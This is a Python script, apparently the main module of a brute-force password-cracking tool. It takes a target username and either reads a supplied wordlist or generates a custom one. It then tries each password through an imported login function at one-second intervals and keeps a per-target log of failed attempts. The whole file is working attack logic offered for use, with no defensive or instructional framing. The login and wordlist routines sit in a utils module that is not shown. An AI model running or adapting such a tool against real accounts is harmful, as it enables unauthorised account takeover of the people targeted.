from utils import (
    generate_wordlist,
    get_args,
    close,
    login,
    display_banner
)


import os
import time



def setup_log_files(targetName):
    if not os.path.exists('Logs'):
        os.mkdir('Logs')
    if not os.path.exists(f'Logs/{targetName}'):
        os.mkdir(f'Logs/{targetName}')
        with open(f'Logs/{targetName}/wrong-passwords.txt', 'w') as f:
            f.close()
        with open(f'Logs/{targetName}/custom-wordlist.txt', 'w') as f:
            f.close()

    
def wordlist_attack(username: str, wordlist: str):
    if not os.path.exists(wordlist):
        close(f'Could not locate {wordlist}. Quitting..')
    if not wordlist.endswith('.txt'):
        close('File must be a text (.txt) file. Quitting..')
    
    def read_file(wordlist=wordlist):
        with open(wordlist) as fp:
            while True:
                password = fp.readline()
                if not password:
                    break
                login(username, password)
                time.sleep(1)
    read_file()


def main():
    display_banner()
    args = get_args()
    setup_log_files(args.username)
    if args.wordlist != 'None':
        wordlist_attack(args.username, args.wordlist)
    else:
        generate_wordlist(f'Logs/{args.username}/custom-wordlist.txt')
        wordlist_attack(args.username, f'Logs/{args.username}/custom-wordlist.txt')

if __name__ == '__main__':
    main()